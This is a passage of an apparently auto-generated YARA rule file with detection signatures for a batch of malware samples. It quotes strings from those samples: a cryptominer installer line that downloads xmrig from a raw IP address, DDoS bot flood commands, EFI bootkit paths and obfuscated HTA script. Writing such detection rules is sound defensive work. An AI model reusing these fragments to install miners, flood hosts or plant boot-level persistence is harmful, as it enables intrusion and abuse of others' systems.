      $s13 = "nVPdJyk1T7ZNAAAAwFux8v4YJDvwgh1LwTMSiUTSJNcIuVbINQOT35QOrANTkQQoqwKkVSQY6gO/GHnyB426wPpkpIHzVAAeAAAAGA+uXPrrcOKVh4eZ526fDKyRSKSp" ascii /* score: '14.00'*/
      $s14 = "7Vd+HUg7um3HnKJ9t2Pyfamqw54DX4/tg+g3PttfmfO6PtepOkey7deV7Z+n/dCk9fn6dVyS37Jj8nPj+2Jp/dquzldqXLLPB3Vt3VXt2HJN+q95tC86Hl+mqq4qWo+M" ascii /* score: '14.00'*/
      $s15 = "x7Ha+aj4Pdar7ZvUfS0W5klScbyVc+HmvjTHtfM/NirnOI6lN7binPkx61iy8xHnsTDWLH+cN9NW9Zpya7GT/OvBKvSts95qr6vJ12pO+tznmiRtbdu51uoannWprsXy" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 3000KB and
      8 of them
}

rule sig_344a132e9b873a8e766a40eaeb5f522ce35d56e6f577f0b12cc40384ce1fef4a_344a132e {
   meta:
      description = "_subset_batch - file 344a132e9b873a8e766a40eaeb5f522ce35d56e6f577f0b12cc40384ce1fef4a_344a132e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "344a132e9b873a8e766a40eaeb5f522ce35d56e6f577f0b12cc40384ce1fef4a"
   strings:
      $x1 = "costura.system.runtime.compilerservices.unsafe.dll.compressed|6.0.1.0|System.Runtime.CompilerServices.Unsafe, Version=6.0.1.0, C" ascii /* score: '44.00'*/
      $x2 = "costura.system.linq.async.dll.compressed|4.1.0.0|System.Linq.Async, Version=4.1.0.0, Culture=neutral, PublicKeyToken=94bc3704cdd" ascii /* score: '44.00'*/
      $x3 = "costura.system.valuetuple.dll.compressed|4.0.3.0|System.ValueTuple, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2" ascii /* score: '44.00'*/
      $x4 = "costura.system.threading.tasks.extensions.dll.compressed|4.2.0.1|System.Threading.Tasks.Extensions, Version=4.2.0.1, Culture=neu" ascii /* score: '44.00'*/
      $x5 = "costura.system.text.encodings.web.dll.compressed|9.0.0.2|System.Text.Encodings.Web, Version=9.0.0.2, Culture=neutral, PublicKeyT" ascii /* score: '44.00'*/
      $x6 = "costura.system.buffers.dll.compressed|4.0.4.0|System.Buffers, Version=4.0.4.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|" ascii /* score: '44.00'*/
      $x7 = "costura.system.io.pipelines.dll.compressed|9.0.0.2|System.IO.Pipelines, Version=9.0.0.2, Culture=neutral, PublicKeyToken=cc7b13f" ascii /* score: '44.00'*/
      $x8 = "costura.system.text.encoding.codepages.dll.compressed|8.0.0.0|System.Text.Encoding.CodePages, Version=8.0.0.0, Culture=neutral, " ascii /* score: '44.00'*/
      $x9 = "costura.system.text.json.dll.compressed|9.0.0.2|System.Text.Json, Version=9.0.0.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2dd" ascii /* score: '44.00'*/
      $x10 = "costura.system.drawing.common.dll.compressed|6.0.0.0|System.Drawing.Common, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7" ascii /* score: '44.00'*/
      $x11 = "costura.system.threading.channels.dll.compressed|4.0.2.0|System.Threading.Channels, Version=4.0.2.0, Culture=neutral, PublicKeyT" ascii /* score: '44.00'*/
      $x12 = "costura.system.collections.immutable.dll.compressed|1.2.5.0|System.Collections.Immutable, Version=1.2.5.0, Culture=neutral, Publ" ascii /* score: '44.00'*/
      $x13 = "costura.system.numerics.vectors.dll.compressed|4.1.5.0|System.Numerics.Vectors, Version=4.1.5.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x14 = "costura.system.memory.dll.compressed|4.0.2.0|System.Memory, Version=4.0.2.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|Sy" ascii /* score: '44.00'*/
      $x15 = "costura.system.threading.tasks.dataflow.dll.compressed|4.6.5.0|System.Threading.Tasks.Dataflow, Version=4.6.5.0, Culture=neutral" ascii /* score: '44.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*)
}

rule sig_43c728c902bad077c72e7c9cee443eda_imphash_ {
   meta:
      description = "_subset_batch - file 43c728c902bad077c72e7c9cee443eda(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "57edefd7a8c28a998c847b848b16d3f9f79304d86a0a5b741b56121552685752"
   strings:
      $x1 = "Probably key involve option approach good. Blue your picture leader suffer politics. Also Republican wife seat number. Seem sist" ascii /* score: '45.00'*/
      $x2 = "Inside bar growth yeah. Later tonight minute avoid scientist someone benefit. Machine current while particular. Hope room cost h" ascii /* score: '43.00'*/
      $x3 = "Tough painting short treatment provide letter. Heavy energy their today partner. Little medical base music. Weight car history b" ascii /* score: '41.00'*/
      $x4 = "Miss traditional rate itself exactly then. Late build discussion pressure. Property their country western ball. From think repor" ascii /* score: '40.00'*/
      $x5 = "Name music foreign Congress themselves himself such. Our same support arm above what. Different simple road quite. Forward plan " ascii /* score: '37.00'*/
      $x6 = "Own put early establish country meet goal. Operation feel before attention sort religious. Leader trouble wall anyone citizen. O" ascii /* score: '37.00'*/
      $x7 = "Check decade how performance. Institution she suggest take. Your total seek save seven toward city. Page difference cell finally" ascii /* score: '37.00'*/
      $x8 = "Note measure herself power. Management way say TV. Door movement significant all life wall fill foot. Wrong participant shake lo" ascii /* score: '36.00'*/
      $x9 = "Happy significant party that body tree effort our. Safe its customer high. Now cup street eight including. College reach charge " ascii /* score: '35.00'*/
      $x10 = "Upon floor lose not us. Land although everyone someone. Back health marriage actually. Former author professional. Customer fede" ascii /* score: '33.00'*/
      $x11 = "Whatever school trial tonight ahead. Lawyer race event include. Where network as change win. Will ever hear. Institution persona" ascii /* score: '32.00'*/
      $x12 = "Chair build share notice Congress road bad. Week else particular and performance. To edge agreement series near position. Upon i" ascii /* score: '32.00'*/
      $x13 = "East nation operation source street task. Bad can Democrat central. Issue network recent wait example everyone. Military raise c" ascii /* score: '31.00'*/
      $s14 = "Collection several ok professor effect develop career throw. Same town development job. You party account. Fund while eat sport " ascii /* score: '30.00'*/
      $s15 = "Art friend rock top drug media. Idea authority son maybe bed. Begin investment need lose join. State agreement ten bill. Expert " ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule sig_4a2e5c7eaa14a366d48bebafd88686fc_imphash_ {
   meta:
      description = "_subset_batch - file 4a2e5c7eaa14a366d48bebafd88686fc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "71b31d1375414c06148aa7af009634facaf79220790c07863702459c05aab09e"
   strings:
      $s1 = "failed to to lock creation mutex" fullword ascii /* score: '20.00'*/
      $s2 = "failed to to lock cleanup mutex" fullword ascii /* score: '20.00'*/
      $s3 = "bIXVte3Im" fullword ascii /* base64 encoded string '!um{r&' */ /* score: '14.00'*/
      $s4 = "failed to get string from atom" fullword ascii /* score: '14.00'*/
      $s5 = "VFAAMWE3Z" fullword ascii /* base64 encoded string 'TP 1a7' */ /* score: '14.00'*/
      $s6 = "kAHNwMEMw" fullword ascii /* base64 encoded string ' sp0C0' */ /* score: '14.00'*/
      $s7 = "pJjZRICxZ" fullword ascii /* base64 encoded string '&6Q ,Y' */ /* score: '14.00'*/
      $s8 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s9 = "# 5(c[$\\" fullword ascii /* score: '13.00'*/ /* hex encoded string '\' */
      $s10 = "73V9eskqA05RpJ83D0ADA2C9c0JvghfkPVtRKoyjKj6AbtVQm4rT2dpnRJb0pzjbR1CUZqtZCb3b5Chte3Im0LrwqFAAM73V9eskqA05RpJ83D0ADA2C9c0JvghfkPVt" ascii /* score: '11.00'*/
      $s11 = "eskqA05RpJ83D0ADA2C9c0JvghfkPVtRKoyjKj6AbtVQm4rT2dpnRJb0pzjbR1CUZqtZCb3b5Chte3Im0LrwqFAAM73V9eskqA05RpJ83D0ADA2C9c0JvghfkPVtRKoy" ascii /* score: '11.00'*/
      $s12 = "E0ADA2C9c0JvghfkPVtRKoyjKj6AbtVQm4rT2dpnRJb0pzjbR1CUZqtZCb3b5Chte3Im0LrwqFAAM73V9eskqA05RpJ83D0ADA2C9c0JvghfkPVtRKoyjKj6AbtVQm4r" ascii /* score: '11.00'*/
      $s13 = "5Chte3Im0LrwqFAAM73V9eskqA05RpJ83D0ADA2C9c0JvghfkPVtRKoyjKj6AbtVQm4rT2dpnRJb0pzjbR1CUZqtZCb3b5Chte3Im0LrwqFAAM73V9eskqA05RpJ83D0" ascii /* score: '11.00'*/
      $s14 = "1CUZqtZCb3b5Chte3Im0LrwqFAAM73V9eskqA05RpJ83D0ADA2C9c0JvghfkPVtRKoyjKj6AbtVQm4rT2dpnRJb0pzjbR1CUZqtZCb3b5Chte3Im0LrwqFAAM73V9esk" ascii /* score: '11.00'*/
      $s15 = "tVQm4rT2dpnRJb0pzjbR1CUZqtZCb3b5Chte3Im0LrwqFAAM73V9eskqA05RpJ83D0ADA2C9c0JvghfkPVtRKoyjKj6AbtVQm4rT2dpnRJb0pzjbR1CUZqtZCb3b5CJl" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 22000KB and
      8 of them
}

rule sig_6412475c12ee2e59136ac792dc72ffd9_imphash_ {
   meta:
      description = "_subset_batch - file 6412475c12ee2e59136ac792dc72ffd9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3634a8826e32417447d13408de090e5e61830d9efc5919a07102631ad779032a"
   strings:
      $x1 = "Politics outside Democrat protect rate. Defense away arrive within. Rest choose society option crime finish likely center. Resul" ascii /* score: '44.00'*/
      $x2 = "Particularly attack marriage various figure. Analysis attack eight also consumer resource. Break perhaps reduce far. Study repre" ascii /* score: '44.00'*/
      $x3 = "Clearly officer just western standard. Table deal whom each international scientist difficult. Change personal just property rev" ascii /* score: '40.00'*/
      $x4 = "Office relate bar Democrat available piece draw. Fill I edge executive. Scene affect financial dark success. Simple talk else. W" ascii /* score: '39.00'*/
      $x5 = "Professor military likely officer thing represent type. Candidate down your act concern. State write candidate significant image" ascii /* score: '37.00'*/
      $x6 = "A tell a wind. Vote capital yes life. Interview scene pass trade she. Mrs Mr could move defense population recognize fund. Oppor" ascii /* score: '37.00'*/
      $x7 = "Strong I sound. Anything front necessary mind. Need scene responsibility side professional. Pretty dinner space. Dinner after pr" ascii /* score: '36.00'*/
      $x8 = "Other model small skill. Authority only trip bank. System successful push minute career live. Some agency training see shake hea" ascii /* score: '35.00'*/
      $x9 = "Question inside million special. Least public up pay look. Live realize special service black face today. Shoulder company insti" ascii /* score: '35.00'*/
      $x10 = "Care forget data card sea themselves. Represent present thus part. Decade option four. Reach enjoy cell yes bit. Behavior early " ascii /* score: '35.00'*/
      $x11 = "Fire mission growth major. Hope customer short support all shake. Around range style question board compare entire expect. Witho" ascii /* score: '35.00'*/
      $x12 = "Thousand all true support hour nature dark address. Physical scene develop hope meeting. Couple attack though southern up. Stati" ascii /* score: '35.00'*/
      $x13 = "The always involve too away. Their rise brother message seat. Commercial outside body reality. South nothing well. Forget sort r" ascii /* score: '35.00'*/
      $x14 = "Social prove rule cell. Sign several center himself amount hope first. Ago man expert candidate sport. Item his thousand they. N" ascii /* score: '32.00'*/
      $x15 = "Others nothing nice wide card. Away specific fine win player race perform another. Itself prove memory or responsibility. Happy " ascii /* score: '32.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*)
}

rule sig_6cd5e9e7b0a3bfc821de1eac090071fa_imphash_ {
   meta:
      description = "_subset_batch - file 6cd5e9e7b0a3bfc821de1eac090071fa(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e6d4cf69c7865d4d7bab00aba364a95cea0bd3aad16042df4586809675c5ad4c"
   strings:
      $s1 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s2 = "PROCESSOR_CORE2" fullword ascii /* score: '15.00'*/
      $s3 = "PROCESSOR_NEHALEM" fullword ascii /* score: '15.00'*/
      $s4 = "PROCESSOR_I386" fullword ascii /* score: '15.00'*/
      $s5 = "PROCESSOR_BDVER1" fullword ascii /* score: '15.00'*/
      $s6 = "PROCESSOR_GEODE" fullword ascii /* score: '15.00'*/
      $s7 = "PROCESSOR_LAKEMONT" fullword ascii /* score: '15.00'*/
      $s8 = "PROCESSOR_BDVER3" fullword ascii /* score: '15.00'*/
      $s9 = "PROCESSOR_K6" fullword ascii /* score: '15.00'*/
      $s10 = "PROCESSOR_BDVER4" fullword ascii /* score: '15.00'*/
      $s11 = "processor_type" fullword ascii /* score: '15.00'*/
      $s12 = "PROCESSOR_ATHLON" fullword ascii /* score: '15.00'*/
      $s13 = "PROCESSOR_K8" fullword ascii /* score: '15.00'*/
      $s14 = "PROCESSOR_PENTIUM" fullword ascii /* score: '15.00'*/
      $s15 = "PROCESSOR_SKYLAKE_AVX512" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule sig_20fbf95c129365c6ec6c0bf20c8fd6a294bd8321f19ddaab96d522bf7ac333e9_20fbf95c {
   meta:
      description = "_subset_batch - file 20fbf95c129365c6ec6c0bf20c8fd6a294bd8321f19ddaab96d522bf7ac333e9_20fbf95c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "20fbf95c129365c6ec6c0bf20c8fd6a294bd8321f19ddaab96d522bf7ac333e9"
   strings:
      $s1 = "ReLoader64_.dll" fullword ascii /* score: '29.00'*/
      $s2 = "Dhttp://www.microsoft.com/pki/certs/MicCorThiParMarRoo_2010-10-05.crt0" fullword ascii /* score: '17.00'*/
      $s3 = "Failed to GetInfo %S,Status:%x" fullword ascii /* score: '15.00'*/
      $s4 = "%EASSERT FAILED: %a(%d): %a%N" fullword ascii /* score: '14.00'*/
      $s5 = "Read file(%S) failed!rx:0x%lx" fullword ascii /* score: '13.00'*/
      $s6 = "Khttp://crl.microsoft.com/pki/crl/products/MicCorThiParMarRoo_2010-10-05.crl0`" fullword ascii /* score: '13.00'*/
      $s7 = "LoadLibrary Error: the read length(%d) not equal the length of the actual return" fullword ascii /* score: '13.00'*/
      $s8 = "Bhttp://www.microsoft.com/pkiops/crl/MicCorUEFCA2011_2011-06-27.crl0`" fullword ascii /* score: '13.00'*/
      $s9 = "Input: error return from ReadKey %x" fullword ascii /* score: '13.00'*/
      $s10 = "Dhttp://www.microsoft.com/pkiops/certs/MicCorUEFCA2011_2011-06-27.crt0" fullword ascii /* score: '13.00'*/
      $s11 = "%u: Read file failed!" fullword ascii /* score: '12.50'*/
      $s12 = "Get device path failed!FileName:%s" fullword ascii /* score: '12.00'*/
      $s13 = "Failed to GetInfo,Status:%x" fullword ascii /* score: '12.00'*/
      $s14 = "\\EFI\\Microsoft\\boot\\cloak64.dat" fullword wide /* score: '12.00'*/
      $s15 = "\\EFI\\boot\\cloak64.dat" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule sig_6c50fa662b373792aa35b479ef089233_imphash_ {
   meta:
      description = "_subset_batch - file 6c50fa662b373792aa35b479ef089233(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "72ee2c85cd1acea6412213a9792118937d81db322090ac114e3c0dedf426cd29"
   strings:
      $x1 = "C:\\Users\\4674\\Documents\\GitHub\\NOTOCAR\\svchost\\svchost\\Release\\svchost.pdb" fullword ascii /* score: '34.00'*/
      $s2 = "service.exe" fullword ascii /* score: '25.00'*/
      $s3 = "xmscoree.dll" fullword wide /* score: '23.00'*/
      $s4 = "audiodg.exe" fullword ascii /* score: '22.00'*/
      $s5 = "httpbypass" fullword ascii /* score: '22.00'*/
      $s6 = "windows.exe" fullword ascii /* score: '22.00'*/
      $s7 = "wrs.exe" fullword ascii /* score: '19.00'*/
      $s8 = "httppost" fullword ascii /* score: '16.00'*/
      $s9 = "httpflood" fullword ascii /* score: '16.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "GET / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s12 = "Empty command" fullword ascii /* score: '12.00'*/
      $s13 = "Unknown command or invalid parameters." fullword ascii /* score: '12.00'*/
      $s14 = "Admin required for !NTP-AMP, falling back to UDP flood on port 123." fullword ascii /* score: '12.00'*/
      $s15 = "Admin required for !DNS-AMP, falling back to UDP flood on port 53." fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_411bb4e0379ab54508f1fc2b13779d0bc16fb81ccd5c83b06e11a2e7c4038903_411bb4e0 {
   meta:
      description = "_subset_batch - file 411bb4e0379ab54508f1fc2b13779d0bc16fb81ccd5c83b06e11a2e7c4038903_411bb4e0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "411bb4e0379ab54508f1fc2b13779d0bc16fb81ccd5c83b06e11a2e7c4038903"
   strings:
      $s1 = "C:\\local0\\asf\\release\\build-2.2.14\\support\\Release\\ab.pdb" fullword ascii /* score: '21.00'*/
      $s2 = " Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/<br>" fullword ascii /* score: '17.00'*/
      $s3 = "    -T content-type Content-type header for POSTing, eg." fullword ascii /* score: '15.00'*/
      $s4 = "    -h              Display usage information (this message)" fullword ascii /* score: '12.00'*/
      $s5 = "    -p postfile     File containing data to POST. Remember also to set -T" fullword ascii /* score: '12.00'*/
      $s6 = "    -i              Use HEAD instead of GET" fullword ascii /* score: '12.00'*/
      $s7 = " Licensed to The Apache Software Foundation, http://www.apache.org/<br>" fullword ascii /* score: '10.00'*/
      $s8 = "    -r              Don't exit on socket receive errors." fullword ascii /* score: '10.00'*/
      $s9 = "    -k              Use HTTP KeepAlive feature" fullword ascii /* score: '10.00'*/
      $s10 = " This is ApacheBench, Version %s <i>&lt;%s&gt;</i><br>" fullword ascii /* score: '10.00'*/
      $s11 = "    -X proxy:port   Proxyserver and port number to use" fullword ascii /* score: '9.00'*/
      $s12 = "    -H attribute    Add Arbitrary header line, eg. 'Accept-Encoding: gzip'" fullword ascii /* score: '8.00'*/
      $s13 = "  %d%%  %5I64d" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule sig_7f2c5ae7c3fb101923ade86a2198a928bd3f198097bd657e9294b4dfcbaac138_7f2c5ae7 {
   meta:
      description = "_subset_batch - file 7f2c5ae7c3fb101923ade86a2198a928bd3f198097bd657e9294b4dfcbaac138_7f2c5ae7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7f2c5ae7c3fb101923ade86a2198a928bd3f198097bd657e9294b4dfcbaac138"
   strings:
      $s1 = "publickey-hostbound-v00@openssh.com" fullword ascii /* score: '29.00'*/
      $s2 = "usage: ssh-agent [-c | -s] [-Dd] [-a bind_address] [-E fingerprint_hash]" fullword ascii /* score: '27.00'*/
      $s3 = "unexpected session ID (%zu listed) on signature request for target user %s with key %s %s" fullword ascii /* score: '23.00'*/
      $s4 = "session-bind@openssh.com" fullword ascii /* score: '21.00'*/
      $s5 = "webauthn-sk-ecdsa-sha2-nistp256@openssh.com" fullword ascii /* score: '21.00'*/
      $s6 = "process_ext_session_bind" fullword ascii /* score: '21.00'*/
      $s7 = "socketentry fd=%d, entry %zu %s, from hostkey %s %s to user %s hostkey %s %s" fullword ascii /* score: '20.50'*/
      $s8 = "msys-gcc_s-seh-1.dll" fullword ascii /* score: '20.00'*/
      $s9 = "process_lock_agent" fullword ascii /* score: '20.00'*/
      $s10 = "msys-crypto-3.dll" fullword ascii /* score: '20.00'*/
      $s11 = "msys-2.0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "subprocess" fullword ascii /* score: '19.00'*/
      $s13 = "rsa-sha2-256-cert-v01@openssh.com" fullword ascii /* score: '18.00'*/
      $s14 = "rsa-sha2-512-cert-v01@openssh.com" fullword ascii /* score: '18.00'*/
      $s15 = "chacha20-poly1305@openssh.com" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_2a1e2eaba266eff846286f32a04fc6de397e376017246dad57a1316ec5014af9_2a1e2eab {
   meta:
      description = "_subset_batch - file 2a1e2eaba266eff846286f32a04fc6de397e376017246dad57a1316ec5014af9_2a1e2eab.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2a1e2eaba266eff846286f32a04fc6de397e376017246dad57a1316ec5014af9"
   strings:
      $s1 = "    if ! download_with_retry \"http://46.8.231.224/scripts/xmrig.tar.gz\" \"/tmp/xmrig.tar.gz\"; then" fullword ascii /* score: '25.00'*/
      $s2 = "ExecStart=$HOME/4thepool/xmrig --config=$HOME/4thepool/config.json" fullword ascii /* score: '23.00'*/
      $s3 = "    log \"ERROR\" \"Download failed after $max_retries attempts.\"" fullword ascii /* score: '20.00'*/
      $s4 = "    echo -e \"Report issues to: support@4thepool.com\"" fullword ascii /* score: '20.00'*/
      $s5 = "    sed -i \"s#\\\"pass\\\":.*#\\\"pass\\\": \\\"$HOSTNAME\\\",#\" \"$CONFIG_FILE\"" fullword ascii /* score: '18.00'*/
      $s6 = "WantedBy=multi-user.target" fullword ascii /* score: '17.00'*/
      $s7 = "    sed -i \"s#\\\"url\\\":.*#\\\"url\\\": \\\"auto.4thepool.lol:$PORT\\\",#\" \"$CONFIG_FILE\"" fullword ascii /* score: '16.00'*/
      $s8 = "    echo -e \"${GREEN}    4thePool Mining Setup Script v$VERSION    ${NC}\"" fullword ascii /* score: '16.00'*/
      $s9 = "        elif command -v wget &>/dev/null; then" fullword ascii /* score: '15.00'*/
      $s10 = "        if ! command -v $tool &> /dev/null; then" fullword ascii /* score: '15.00'*/
      $s11 = "        if command -v curl &>/dev/null; then" fullword ascii /* score: '15.00'*/
      $s12 = "        log \"INFO\" \"To view logs: sudo journalctl -u 4thepool_miner.service -f\"" fullword ascii /* score: '15.00'*/
      $s13 = "After=network.target" fullword ascii /* score: '14.00'*/
      $s14 = "            echo -e \"${RED}[ERROR]${NC} $timestamp - $message\"" fullword ascii /* score: '14.00'*/
      $s15 = "# 4thePool Mining Setup Script" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 40KB and
      8 of them
}

rule sig_0fc18faa59e901b55ff8ed0c4d298783_imphash_ {
   meta:
      description = "_subset_batch - file 0fc18faa59e901b55ff8ed0c4d298783(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fc3e2d3e23e3f410b9a7c0eaff3ed7bdde7b0bb49d737494cc4cfad3ff0f4e69"
   strings:
      $s1 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '30.00'*/
      $s2 = "#$*+-./:?@\\_cmd.exe /e:ON /v:OFF /d /c \"" fullword ascii /* score: '28.00'*/
      $s3 = "internal error: entered unreachable codeOscodekindmessageKindErrorCustomerrorentity not foundpermission deniedconnection refused" ascii /* score: '27.00'*/
      $s4 = "exe\\cmd.exe" fullword ascii /* score: '26.00'*/
      $s5 = "2NTDLL.DLL" fullword wide /* score: '23.00'*/
      $s6 = "failed to spawn thread" fullword ascii /* score: '18.00'*/
      $s7 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s8 = "nbroken pipeentity already existsoperation would blocknot a directoryis a directorydirectory not emptyread-only filesystem or st" ascii /* score: '18.00'*/
      $s9 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s10 = "expand 32-byte kPoisonError" fullword ascii /* score: '17.00'*/
      $s11 = "NetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFi" ascii /* score: '16.00'*/
      $s12 = "assertion failed: edge.height == self.node.height - 1" fullword ascii /* score: '15.00'*/
      $s13 = "library\\std\\src\\sys\\process\\windows.rs" fullword ascii /* score: '15.00'*/
      $s14 = "assertion failed: edge.height == self.height - 1" fullword ascii /* score: '15.00'*/
      $s15 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_44d8a197c84278da32b54956d7f26e65_imphash_ {
   meta:
      description = "_subset_batch - file 44d8a197c84278da32b54956d7f26e65(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f37270779667751dd0ef109350f3c0e7f8c0bdc38354a4b9b381f04bdae7ec10"
   strings:
      $s1 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s2 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s3 = "vyfffff" fullword ascii /* score: '8.00'*/
      $s4 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule sig_44d8a197c84278da32b54956d7f26e65_imphash__03fdec2f {
   meta:
      description = "_subset_batch - file 44d8a197c84278da32b54956d7f26e65(imphash)_03fdec2f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "03fdec2fb20214bd240929ebb41581b7c1236e212f2fac0f85753ef0032de0f7"
   strings:
      $s1 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s2 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s3 = "vyfffff" fullword ascii /* score: '8.00'*/
      $s4 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule sig_69e7957ebc4546ed7a08366d457acaae_imphash_ {
   meta:
      description = "_subset_batch - file 69e7957ebc4546ed7a08366d457acaae(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "003b3e35b5af284d9087f9eaa3d2fda77887fc727212bb3f0e98bed9c3765903"
   strings:
      $s1 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s2 = "vyfffff" fullword ascii /* score: '8.00'*/
      $s3 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule sig_69e7957ebc4546ed7a08366d457acaae_imphash__3b5f2981 {
   meta:
      description = "_subset_batch - file 69e7957ebc4546ed7a08366d457acaae(imphash)_3b5f2981.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3b5f2981cfa90e5b420c5b610b957fd0febfd3feaad05484959561bf362d3326"
   strings:
      $s1 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s2 = "vyfffff" fullword ascii /* score: '8.00'*/
      $s3 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule sig_0563be023d98b322bb21536f98acba61e73c3502d5e9b93b6d27ca2be876fb68_0563be02 {
   meta:
      description = "_subset_batch - file 0563be023d98b322bb21536f98acba61e73c3502d5e9b93b6d27ca2be876fb68_0563be02.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0563be023d98b322bb21536f98acba61e73c3502d5e9b93b6d27ca2be876fb68"
   strings:
      $s1 = "* 0xdbba0)[_0x4e88b2(-0x190, -a0_0x479ce5._0x208c34)](), _0x1f86b9 = [];" fullword ascii /* score: '16.00'*/
      $s2 = "4259)]['\\x74\\x6f\\x4c\\x6f\\x77\\x65\\x72\\x43\\x61\\x73' + '\\x65']() === _0x5077ee(-0x22, -0xcf) && (_0x33cf60 += '\\x2d\\x2" ascii /* score: '12.00'*/
      $s3 = "243a0(0x121, -0x3c)) / 0x9 * (parseInt(_0x2243a0(0x98, a0_0x14ee0c._0x57ce8a)) / 0xa);" fullword ascii /* score: '12.00'*/
      $s4 = "-a0_0xf61c26._0x5e8f99, -0xf1)] = 0x3, _0x1eabfb[_0x3ef0e3(a0_0xf61c26._0x2338ae, -0x2a) + _0x3ef0e3(-a0_0xf61c26._0x3a7023, -a0" ascii /* score: '12.00'*/
      $s5 = "x1d6c12(-a0_0x13a8ba._0x3edd96, -0x12e)), _0x48dcdc = _0x1d6c12(0x14a, 0x71) + _0x1d6c12(-a0_0x13a8ba._0x1618b4, -0x113) + encod" ascii /* score: '12.00'*/
      $s6 = "ac5[_0x4cef92(-a0_0x2108fd._0x265f54, -0x335)](_0x4b100f[_0x4cef92(-0x14d, 0x26) + '\\x64\\x79']), _0x3cbac5[_0x4cef92(-a0_0x210" ascii /* score: '12.00'*/
